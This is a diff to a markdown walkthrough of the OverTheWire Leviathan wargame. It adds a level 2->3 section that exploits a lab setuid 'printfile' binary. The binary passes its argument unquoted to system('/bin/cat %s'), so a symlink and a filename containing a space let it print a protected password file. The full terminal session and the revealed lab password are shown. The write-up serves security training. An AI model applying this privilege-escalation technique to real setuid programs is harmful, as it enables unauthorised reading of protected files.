@@ -34,6 +34,8 @@ Data for the levels can be found in the homedirectories. You can look at /etc/le
 ```
 
 ## 0->1
+This level involves `grep`-ing a directory.
+
 ```bash
 % ssh leviathan.labs.overthewire.org -l leviathan0 -p 2223
 
@@ -54,7 +56,8 @@ leviathan0@gibson:~/.backup$ grep leviathan bookmarks.html
 ```
 
 ## 1->2
-you need to know `strings` and `ltrace` to be able to solve this one.
+This level introduces us to two commands, ltrace and strings.
+
 
 ```bash
 % ssh leviathan.labs.overthewire.org -l leviathan1 -p 2223
@@ -88,4 +91,105 @@ NsN1HwFoyN
 ```
 
 
+## 2->3
+This level involves creating a symbolic link (symlink) which enables privilege escalation by exploiting how the printfile binary handles file inputs.
+
+By creating a symlink and calling the printfile binary with a filename that includes a space, you leverage the improper input handling in the program. This combination allows access to files that leviathan2 wouldn’t normally have permissions for, thus effectively "hacking" the system to print the sensitive file's contents.
+
+Feeding two inputs to the printfile binary gives us several insights into how the binary processes inputs and how it manages to retrieve file contents. The behavior of the binary with two inputs shows that it accepts and processes only the first argument. The first step in the binary’s execution is to perform an access check for the first file. The `snprintf` call shows how the command is constructed. The calls to `geteuid()` reveal the effective user ID during execution. By running `ltrace`, you can infer potential vulnerabilities.
+
+The fact that input parsing only considers the first file suggests that if unexpected input patterns (like filenames with spaces) are used, it might exploit the way the binary interprets or constructs file names. This detail can lead to privilege escalation tactics.
+
+
+```bash
+% ssh leviathan.labs.overthewire.org -l leviathan2 -p 2223
+
+leviathan2@gibson:~$ ls -alh
+total 36K
+drwxr-xr-x  2 root       root       4.0K Apr 10 14:23 .
+drwxr-xr-x 83 root       root       4.0K Apr 10 14:24 ..
+-rw-r--r--  1 root       root        220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root       3.7K Mar 31  2024 .bashrc
+-r-sr-x---  1 leviathan3 leviathan2  15K Apr 10 14:23 printfile
+-rw-r--r--  1 root       root        807 Mar 31  2024 .profile
+leviathan2@gibson:~$ file printfile 
+printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=79cfa8b87bb611f9cf6d6865010709e2ba5c8e3f, for GNU/Linux 3.2.0, not stripped
+leviathan2@gibson:~$ ./printfile 
+*** File Printer ***
+Usage: ./printfile filename
+leviathan2@gibson:~$ ./printfile .bash_logout 
+# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+fi
+leviathan2@gibson:~$ ./printfile .bash_logout .profile
+# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+fi
+leviathan2@gibson:~$ ltrace ./printfile .bash_logout .profile
+__libc_start_main(0x80490ed, 3, 0xffffd464, 0 <unfinished ...>
+access(".bash_logout", 4)                                                           = 0
+snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout")               = 21
+geteuid()                                                                           = 12002
+geteuid()                                                                           = 12002
+setreuid(12002, 12002)                                                              = 0
+system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+fi
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                              = 0
++++ exited (status 0) +++
+leviathan2@gibson:~$ mktemp -d
+/tmp/tmp.kDdtlswch4
+leviathan2@gibson:~$ cd /tmp/tmp.kDdtlswch4
+leviathan2@gibson:/tmp/tmp.kDdtlswch4$ touch "test file.txt"
+leviathan2@gibson:/tmp/tmp.kDdtlswch4$ cd ~
+leviathan2@gibson:~$ ./printfile /tmp/tmp.kDdtlswch4/test\ file.txt 
+/bin/cat: /tmp/tmp.kDdtlswch4/test: Permission denied
+/bin/cat: file.txt: No such file or directory
+leviathan2@gibson:~$ ./printfile /tmp/tmp.kDdtlswch4/"test file.txt"
+/bin/cat: /tmp/tmp.kDdtlswch4/test: Permission denied
+/bin/cat: file.txt: No such file or directory
+leviathan2@gibson:~$ ltrace ./printfile /tmp/tmp.kDdtlswch4/"test file.txt"
+__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
+access("/tmp/tmp.kDdtlswch4/test file.tx"..., 4)                                    = 0
+snprintf("/bin/cat /tmp/tmp.kDdtlswch4/tes"..., 511, "/bin/cat %s", "/tmp/tmp.kDdtlswch4/test file.tx"...) = 42
+geteuid()                                                                           = 12002
+geteuid()                                                                           = 12002
+setreuid(12002, 12002)                                                              = 0
+system("/bin/cat /tmp/tmp.kDdtlswch4/tes".../bin/cat: /tmp/tmp.kDdtlswch4/test: No such file or directory
+/bin/cat: file.txt: No such file or directory
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                              = 256
++++ exited (status 0) +++
+leviathan2@gibson:~$ cd /tmp/tmp.kDdtlswch4
+leviathan2@gibson:/tmp/tmp.kDdtlswch4$ ln -s /etc/leviathan_pass/leviathan3 ./test
+leviathan2@gibson:/tmp/tmp.kDdtlswch4$ ls -alh
+total 232K
+drwx------   2 leviathan2 leviathan2 4.0K May 24 02:25 .
+drwxrwx-wt 559 root       root       224K May 24 02:25 ..
+lrwxrwxrwx   1 leviathan2 leviathan2   30 May 24 02:25 test -> /etc/leviathan_pass/leviathan3
+-rw-rw-r--   1 leviathan2 leviathan2    0 May 24 02:22 test file.txt
+leviathan2@gibson:/tmp/tmp.kDdtlswch4$ cd ~
+leviathan2@gibson:~$ ./printfile /tmp/tmp.kDdtlswch4/"test file.txt"
+/bin/cat: /tmp/tmp.kDdtlswch4/test: Permission denied
+/bin/cat: file.txt: No such file or directory
+leviathan2@gibson:~$ chmod 777 /tmp/tmp.kDdtlswch4
+leviathan2@gibson:~$ ./printfile /tmp/tmp.kDdtlswch4/"test file.txt"
+f0n8h2iWLP
+/bin/cat: file.txt: No such file or directory
+```
 
